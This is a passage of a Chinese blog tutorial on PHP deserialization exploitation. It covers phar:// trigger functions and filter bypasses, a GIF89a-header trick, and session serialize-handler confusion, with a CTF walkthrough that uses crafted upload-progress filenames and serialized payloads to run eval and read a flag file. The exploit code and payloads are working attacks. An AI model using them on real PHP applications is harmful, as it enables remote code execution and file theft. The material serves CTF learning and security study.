hash_file
hash_update_file
md5_file
sha1_file
    
<span class="token comment">// file/url</span>
get_meta_tags
get_headers
    
<span class="token comment">//standard </span>
getimagesize
getimagesizefromstring
    
<span class="token comment">// zip   </span>
<span class="token variable">$zip</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$zip</span><span class="token operator">-&gt;</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'c.zip'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$zip</span><span class="token operator">-&gt;</span><span class="token function">extractTo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phar://test.phar/test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// Bzip / Gzip 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过</span>
<span class="token variable">$z</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'compress.bzip2://phar:///home/sx/test.phar/test.txt'</span><span class="token punctuation">;</span>
<span class="token variable">$z</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'compress.zlib://phar:///home/sx/test.phar/test.txt'</span><span class="token punctuation">;</span>

<span class="token comment">//配合其他协议：(SUCTF)</span>
<span class="token comment">//https://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d/</span>
<span class="token comment">//当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。</span>
<span class="token comment">//php://filter/read=convert.base64-encode/resource=phar://phar.phar</span>

<span class="token comment">//Postgres pgsqlCopyToFile和pg_trace同样也是能使用的，需要开启phar的写功能。</span>
<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token class-name type-declaration">php</span>
	<span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pgsql:host=%s;dbname=%s;user=%s;password=%s"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"postgres"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"sx"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"123456"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	@<span class="token variable">$pdo</span><span class="token operator">-&gt;</span><span class="token function">pgsqlCopyFromFile</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aa'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'phar://phar.phar/aa'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
    
<span class="token comment">// Mysql</span>
<span class="token comment">//LOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper</span>
<span class="token comment">//配置一下mysqld:</span>
<span class="token comment">//[mysqld]</span>
<span class="token comment">//local-infile=1</span>
<span class="token comment">//secure_file_priv=""</span>
    
<span class="token operator">&lt;</span><span class="token operator">?</span>php
<span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$m</span> <span class="token operator">=</span> <span class="token function">mysqli_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mysqli_options</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">,</span> <span class="token constant">MYSQLI_OPT_LOCAL_INFILE</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">mysqli_real_connect</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'testtable'</span><span class="token punctuation">,</span> <span class="token number">3306</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$p</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'LOAD DATA LOCAL INFILE \'phar://test.phar/test\' INTO TABLE a  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<h4><a id="_697"></a>绕过方式</h4> 
<p>当环境限制了phar不能出现在前面的字符里。可以使用<code>compress.bzip2://</code>和<code>compress.zlib://</code>等绕过</p> 
<pre><code class="prism language-php">compress<span class="token operator">.</span>bzip<span class="token punctuation">:</span><span class="token comment">//phar:///test.phar/test.txt</span>
compress<span class="token operator">.</span>bzip2<span class="token punctuation">:</span><span class="token comment">//phar:///test.phar/test.txt</span>
compress<span class="token operator">.</span>zlib<span class="token punctuation">:</span><span class="token comment">//phar:///home/sx/test.phar/test.txt</span>
php<span class="token punctuation">:</span><span class="token comment">//filter/resource=phar:///test.phar/test.txt</span>
</code></pre> 
<p>当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。<br> php://filter/read=convert.base64-encode/resource=phar://phar.phar</p> 
<p>GIF格式验证可以通过在文件头部添加GIF89a绕过<br> 1、$phar-&gt;setStub(“GIF89a”.“&lt;?php __HALT_COMPILER(); ?&gt;”); //设置stub<br> 2、生成一个phar.phar，修改后缀名为phar.gif</p> 
<h3><a id="phpsession_720"></a>php-session反序列化</h3> 
<h4><a id="session_722"></a>session简单介绍</h4> 
<p>在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。</p> 
<p>当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p> 
<h4><a id="session__728"></a>session 的存储机制</h4> 
<p>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。<br> 存储的文件是以sess_sessionid来进行命名的</p> 
<table><thead><tr><th>php_serialize</th><th>经过serialize()函数序列化数组</th></tr></thead><tbody><tr><td>php</td><td>键名+竖线+经过serialize()函数处理的值</td></tr><tr><td>php_binary</td><td>键名的长度对应的ascii字符+键名+serialize()函数序列化的值</td></tr></tbody></table> 
<h4><a id="phpinisession_738"></a>php.ini中一些session配置</h4> 
<blockquote> 
 <p>session.save_path=“” --设置session的存储路径<br> session.save_handler=“”–设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)<br> session.auto_start boolen–指定会话模块是否在请求开始时启动一个会话默认为0不启动<br> session.serialize_handler string–定义用来序列化/反序列化的处理器名字。默认使用php</p> 
</blockquote> 
<h4><a id="_745"></a>利用姿势</h4> 
<h5><a id="sessionupload_progress_747"></a>session.upload_progress进行文件包含和反序列化渗透</h5> 
<p>这篇文章说的很详细了，没必要班门弄斧</p> 
<p>https://www.freebuf.com/vuls/202819.html</p> 
<h5><a id="session_753"></a>使用不同的引擎来处理session文件</h5> 
<h6><a id="_SESSION_755"></a>$_SESSION变量直接可控</h6> 
<p>php引擎的存储格式是<code>键名|serialized_string</code>，而php_serialize引擎的存储格式是<code>serialized_string</code>。如果程序使用两个引擎来分别处理的话就会出现问题</p> 
<p>来看看这两个php</p> 
<pre><code class="prism language-php"><span class="token comment">// 1.php</span>
<span class="token operator">&lt;</span><span class="token operator">?</span>php
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php_serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'y4'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//2.php</span>
<span class="token operator">&lt;</span><span class="token operator">?</span>php
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>首先访问1.php，传入参数<code>a=|O:4:"test":1:{s:4:"name";s:8:"y4tacker";}</code>再访问2.php，注意不要忘记<code>|</code></p> 
<p><img src="https://images2.imgbox.com/7e/0d/siFnqFZQ_o.png" alt="在这里插入图片描述"></p> 
<p>由于<code>1.php</code>是使用<code>php_serialize</code>引擎处理，因此只会把<code>'|'</code>当做一个正常的字符。然后访问<code>2.php</code>，由于用的是<code>php</code>引擎，因此遇到<code>'|'</code>时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对<code>'|'</code>后的值进行反序列化处理。</p> 
<p>这里可能会有一个小疑问，为什么在解析session文件时直接对<code>'|'</code>后的值进行反序列化处理，这也是处理器的功能？这个其实是因为<code>session_start()</code>这个函数，可以看下官方说明：</p> 
<blockquote> 
 <p>当会话自动开始或者通过 <strong>session_start()</strong> 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数。 会话管理器可能是 PHP 默认的， 也可能是扩展提供的（SQLite 或者 Memcached 扩展）， 也可能是通过 <a href="https://www.php.net/manual/zh/function.session-set-save-handler.php" rel="nofollow">session_set_save_handler()</a> 设定的用户自定义会话管理器。 <strong>通过 read 回调函数返回的现有会话数据</strong>（使用特殊的序列化格式存储），<strong>PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量</strong></p> 
</blockquote> 
<p>因此我们成功触发了<code>test</code>类中的<code>__wakeup()</code>方法,所以这种攻击思路是可行的。但这种方法是在可以对<code>session</code>的进行赋值的，那如果代码中不存在对<code>$_SESSION</code>变量赋值的情况下又该如何利用</p> 
<h6><a id="_SESSION_793"></a>$_SESSION变量直接不可控</h6> 
<p>我们来看高校战疫的一道CTF题目</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">//A webshell is wait for you</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">OowoO</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$mdzz</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">mdzz</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">mdzz</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OowoO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_string</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>我们注意到这样一句话<code>ini_set('session.serialize_handler', 'php');</code>，因此不难猜测本身在<code>php.ini</code>当中的设置可能是<code>php_serialize</code>，在查看了<code>phpinfo</code>后得证猜测正确，也知道了这道题的考点</p> 
<p>那么我们就进入phpinfo查看一下，enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；只需往该地址任意 POST 一个名为 PHP_SESSION_UPLOAD_PROGRESS 的字段，就可以将filename的值赋值到session中</p> 
<p><img src="https://images2.imgbox.com/8b/92/9DYmwOv1_o.png" alt="在这里插入图片描述"></p> 
<p>构造文件上传的表单</p> 
<pre><code class="prism language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://web.jarvisoj.com:32784/index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>777<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>接下来构造序列化payload</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php_serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">OowoO</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$mdzz</span><span class="token operator">=</span><span class="token string single-quoted-string">'print_r(scandir(dirname(__FILE__)));'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OowoO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>由于采用Burp发包，为防止双引号被转义，在双引号前加上<code>\</code>，除此之外还要加上<code>|</code></p> 
<p>在这个页面随便上传一个文件，然后抓包修改<code>filename</code>的值</p> 
<p><img src="https://images2.imgbox.com/51/f8/g1kbYvTD_o.png" alt="在这里插入图片描述"></p> 
<p>可以看到<code>Here_1s_7he_fl4g_buT_You_Cannot_see.php</code>这个文件，flag肯定在里面，但还有一个问题就是不知道这个路径，路径的问题就需要回到phpinfo页面去查看</p> 
<p><img src="https://images2.imgbox.com/90/13/clUcivkK_o.png" alt="在这里插入图片描述"></p> 
<p>因此我们只需要把payload，当中改为<code>print_r(file_get_contents("/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"));</code>即可获取flag</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php_serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">OowoO</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$mdzz</span><span class="token operator">=</span><span class="token string single-quoted-string">'print_r(file_get_contents("/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"));'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OowoO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<h2><a id="_887"></a>参考文章</h2> 
<p>https://xz.aliyun.com/t/2715<br> https://xz.aliyun.com/t/2613<br> https://threezh1.com/2019/09/09/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/<br> https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf<br> https://blog.csdn.net/qq_43431158/article/details/99544797<br> https://www.cnblogs.com/or4nge/p/13439974.html<br> https://blog.zsxsoft.com/post/38<br> https://paper.seebug.org/680/<br> https://www.freebuf.com/articles/web/182231.html<br> https://www.freebuf.com/vuls/202819.html</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/13b9d2d822b255f18469eb69f7d438af/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">关于SpringMVC页面跳转不了的问题</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/6b4e1dbaa4d5f921785a429b0a048ce1/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">PVT的理解和以及它们在后仿/功耗仿真中的注意点</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>